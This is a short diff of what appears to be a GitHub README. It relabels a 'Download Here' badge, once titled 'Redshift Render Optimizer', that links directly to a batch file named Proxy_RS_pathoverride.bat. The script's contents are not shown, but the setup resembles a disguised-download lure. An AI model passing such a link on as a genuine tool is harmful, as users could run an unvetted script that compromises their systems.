@@ -4,7 +4,7 @@
 
 📥 **Download Here**
 
-[![Proxy_RS_pathoverride](https://img.shields.io/badge/Download-Redshift%20Render%20Optimizer-blueviolet)](https://github.com/JameHieu/Proxy_RS_pathoverride/blob/main/Proxy_RS_pathoverride.bat)
+[![Proxy_RS_pathoverride](https://img.shields.io/badge/Download_Here-Proxy_RS_pathoverride-blueviolet)](https://github.com/JameHieu/Proxy_RS_pathoverride/blob/main/Proxy_RS_pathoverride.bat)
 
 </aside>  
 
